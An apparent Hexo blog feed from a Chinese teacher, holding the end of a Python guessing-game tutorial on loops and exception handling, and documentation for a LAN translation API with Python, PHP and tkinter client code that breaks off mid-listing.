punctuation">(</span><span class="token string">'密码正确'</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'密码错误'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另一种写法。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">password <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> password<span class="token operator">!=</span><span class="token string">'8888'</span><span class="token punctuation">:</span>    password<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入密码'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'密码正确'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>回到项目中，用户可以一直猜，直到猜中为止，才结束循环，应该怎么做。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'系统自动产生的随机数：'</span><span class="token punctuation">,</span>random_number<span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    guess_number <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入0到100之间的数:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span>  guess_number <span class="token operator">&gt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'大了'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> guess_number <span class="token operator">&lt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小了'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猜对了'</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="10-异常处理"><a href="#10-异常处理" class="headerlink" title="10.异常处理"></a>10.异常处理</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>  <span class="token comment">#尝试执行这段代码</span><span class="token keyword">except</span><span class="token punctuation">:</span>  <span class="token comment">#如果出错就执行这段代码，否则不执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在我们的项目中，如果用户输入的不是数字，会发生什么错误，应该怎么解决呢？</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'系统自动产生的随机数：'</span><span class="token punctuation">,</span>random_number<span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        guess_number <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入0到100之间的数:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你输入的不是数字，请重新输入吧'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span>  guess_number <span class="token operator">&gt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'大了'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> guess_number <span class="token operator">&lt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小了'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猜对了'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11-循环控制"><a href="#11-循环控制" class="headerlink" title="11.循环控制"></a>11.循环控制</h2><ul><li>break 跳出全部循环</li><li>continue 跳出本次循环<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'系统自动产生的随机数：'</span><span class="token punctuation">,</span>random_number<span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        guess_number <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入0到100之间的数:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你输入的不是数字，请重新输入吧'</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span>  guess_number <span class="token operator">&gt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'大了'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> guess_number <span class="token operator">&lt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小了'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猜对了'</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="12-循环…else…"><a href="#12-循环…else…" class="headerlink" title="12.循环…else…"></a>12.循环…else…</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">:</span>     i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>    a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入密码，你有5次机会猜出密码:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">8888</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你触发了break语句，导致else语句不会生效。'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'5次循环你都没猜出密码，else语句生效了。'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="13-for-in-循环"><a href="#13-for-in-循环" class="headerlink" title="13.for..in..循环"></a>13.for..in..循环</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'小红'</span><span class="token punctuation">,</span><span class="token string">'小王'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>也可以使用range函数来产生一系列数字：<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>回到项目中来，如果规定只能猜五次，超过五次就游戏失败，应该怎么做呢？<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'系统自动产生的随机数：'</span><span class="token punctuation">,</span>random_number<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        guess_number <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入0到100之间的数:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你输入的不是数字，请重新输入吧'</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span>  guess_number <span class="token operator">&gt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'大了'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> guess_number <span class="token operator">&lt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小了'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猜对了,你一共猜了'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'次'</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猜了5次都没猜到，游戏失败'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利神翻译接口调用文档</title>
      <link href="/2021/03/26/%E5%88%A9%E7%A5%9E%E7%BF%BB%E8%AF%91%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E6%96%87%E6%A1%A3/"/>
      <url>/2021/03/26/%E5%88%A9%E7%A5%9E%E7%BF%BB%E8%AF%91%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="一、制作背景"><a href="#一、制作背景" class="headerlink" title="一、制作背景"></a>一、制作背景</h2><p>在我的观念里，编程是一个通过查文档解决实际问题、最终不断完善产品的过程，理所应当要借助于网络，否则Python的几十万个第三方库怎么记得住呢？编程不能是死记硬背教材上的知识点，而是学习一种方法，一种思维。<br>但在中职学校，由于学生自制力差，不能开外网，只能反复学习教材上的知识，然后完成教材后的习题，我觉得这是一个值得思考的问题。<br>因此，我开发的项目教学旨在完全脱离教材完成综合项目，我又安装了pylint插件使得学生可以查看本地的文档，但是这又产生了一个新的问题，学生抱怨英语看不懂。<br>综上所述，我花了老大力气，做了一个翻译接口，这下看不懂的英语可以直接翻译，无需外网，翻译几遍总能记住，这下总没借口了吧。<br>原理其实很简单，当然不是我的电脑放了一个本地词典，因为大家其实也发现了，这个是可以翻译句子的，而且支持几十种语言。🤠<br>实际上是通过破解有道词典的翻译接口，最终的翻译服务并不是我提供的，如果某一天接口不能用的，应该就是有道词典的加密系统维护升级了😅</p><h2 id="二、接口调用"><a href="#二、接口调用" class="headerlink" title="二、接口调用"></a>二、接口调用</h2><p>HTTP 方法：<code>POST</code></p><p>请求URL：<code>http://10.163.72.55:5000/todo1</code></p><p>URL参数：</p><p>​    data：需要翻译的内容</p><p>返回：</p><p>​    data{</p><p>​        content：翻译完成的内容</p><p>​    }</p><h2 id="三、请求示例"><a href="#三、请求示例" class="headerlink" title="三、请求示例"></a>三、请求示例</h2><h3 id="1-Python"><a href="#1-Python" class="headerlink" title="1.Python"></a>1.Python</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> requests <span class="token keyword">import</span> put<span class="token punctuation">,</span> gethtml<span class="token operator">=</span>put<span class="token punctuation">(</span><span class="token string">'http://10.163.72.55:5000/todo1'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'data'</span><span class="token punctuation">:</span> <span class="token string">'I am a student'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>html<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-PHP"><a href="#2-PHP" class="headerlink" title="2.PHP"></a>2.PHP</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 解码,Unicode转义(\uXXXX)的编码和解码</span><span class="token keyword">function</span> <span class="token function-definition function">decodeUnicode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace_callback</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\\\u([0-9a-f]{4})/i'</span><span class="token punctuation">,</span>        <span class="token function">create_function</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'$matches'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'return mb_convert_encoding(pack("H*", $matches[1]), "UTF-8", "UCS-2BE");'</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">curlrequest</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$method</span><span class="token operator">=</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//初始化CURL句柄</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置请求的URL</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设为TRUE把curl_exec()结果转化为字串，而不是直接输出</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_CUSTOMREQUEST</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置请求方式</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HTTPHEADER</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"X-HTTP-Method-Override: <span class="token interpolation"><span class="token variable">$method</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置HTTP头信息</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置提交的字符串</span>    <span class="token variable">$document</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//执行预定义的CURL</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$document</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://10.163.72.55:5000/todo1'</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"data=<span class="token interpolation"><span class="token variable">$content</span></span>"</span><span class="token punctuation">;</span>    <span class="token variable">$return</span> <span class="token operator">=</span> <span class="token function">curlrequest</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'put'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// ajax异步返回数据</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$return</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、制作前端窗口"><a href="#四、制作前端窗口" class="headerlink" title="四、制作前端窗口"></a>四、制作前端窗口</h2><p>教大家如何制作一个漂亮的前端窗口，既然是做盗版软件就做得像一点。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> Tk<span class="token punctuation">,</span>Button<span class="token punctuation">,</span>Entry<span class="token punctuation">,</span>Label<span class="token punctuation">,</span>Text<span class="token punctuation">,</span>END<span class="token comment"># 对利神翻译接口发起请求，获得数据</span><span class="token keyword">class</span> <span class="token class-name">LiShenFanYi</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">crawl</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>word<span class="token punctuation">)</span><span class="token punctuation">:</span>        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">'http://10.163.72.55:5000/todo1'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'data'</span><span class="token punctuation">:</span> word<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> html<span class="token comment"># 前段窗口应用程序</span><span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>window <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fanyi <span class="token operator">=</span> LiShenFanYi<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>window<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">u'我的翻译'</span><span class="token punctuation">)</span>  <span class="token comment"># 设置标题</span>        <span class="token comment">#设置窗口大小和位置</span>        self<span class="token punctuation">.</span>window<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'310x370+500+300'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>window<span class="token punctuation">.</span>minsize<span class="token punctuation">(</span><span class="token number">310</span><span class="token punctuation">,</span><span class="token number">370</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>window<span class="token punctuation">.</span>maxsize<span class="token punctuation">(</span><span class="token number">310</span><span class="token punctuation">,</span><span class="token number">370</span><span class="token punctuation">)</span>        <span class="token comment">#创建一个文本框</span>        <span class="token comment">#self.entry = Entry(self.window)</span>        <span class="token comment">#self.entry.place(x=10,y=10,width=200,height=25)</span>        <span class="token comment">#self.entry.bind("&lt;Key-Return&gt;",self.submit1)</span>        self<span class="token punctuation">.</span>result_text1 <span class="token operator">=</span> Text<span class="token punctuation">(</span>self<span class="token punctuation">.</span>window<span class="token punctuation">,</span>background <span class="token operator">=</span> <span class="token string">'azure'</span><span class="token punctuation">)</span> <span class="token comment"># 设置背景颜色</span>        self<span class="token punctuation">.</span>result_text1<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>y <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span>width <span class="token operator">=</span> <span class="token number">285</span><span class="token punctuation">,</span>height <span class="token operator">=</span> <span class="token number">155</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>result_text1<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">"&lt;Key-Return&gt;"</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>submit1<span class="token punctuation">)</span>        <span class="token comment">#创建一个按钮，并为按钮添加事件</span>        self<span class="token punctuation">.</span>submit_btn <span class="token operator">=</span> Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>window<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">u'翻译'</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>submit<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>submit_btn<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">205</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">165</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">35</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>submit_btn2 <span class="token operator">=</span> Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>window<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">u'清空'</span><span class="token punctuation">,</span>command <span class="token operator">=</span> self<span class="token punctuation">.</span>clean<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>submit_btn2<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">250</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">165</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">35</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span>        <span class="token comment">#翻译结果标题</span>        self<span class="token punctuation">.</span>title_label <span class="token operator">=</span> Label<span class="token punctuation">(</span>self<span class="token punctuation">.</span>window<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">u'翻译结果:'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>title_label<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">165</span><span class="token punctuation">)</span>        <span class="token comment">#翻译结果</span>        self<span class="token punctuation">.</span>result_text <span class="token operator">=</span> Text<span class="token punctuation">(</span>self<span class="token punctuation">.</span>window<span class="token punctuation">,</span>background <span class="token operator">=</span> <span class="token string">'light cyan'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>result_text<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>y <span class="token operator">=</span> <span class="token number">190</span><span class="token punctuation">,</span>width <span class="token operator">=</span> <span class="token number">285</span><span class="token punctuation">,</span>height <span class="token operator">=</span> <span class="token number">165</span><span class="token punctuation">)</span>    <span class="token comment"># 回车翻译</span>    <span class="token keyword">def</span> <span class="token function">submit1</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#从输入框获取用户输入的值</span>        content <span class="token operator">=</span> self<span class="token punctuation">.</span>result_text1<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>        <span class="token comment">#把这个值传送给服务器进行翻译</span>        result <span class="token operator">=</span> self<span class="token punctuation">.</span>fanyi<span class="token punctuation">.</span>crawl<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        <span class="token comment">#将结果显示在窗口中的文本框中</span>        self<span class="token punctuation">.</span>result_text<span class="token punctuation">.</span>delete<span class="token 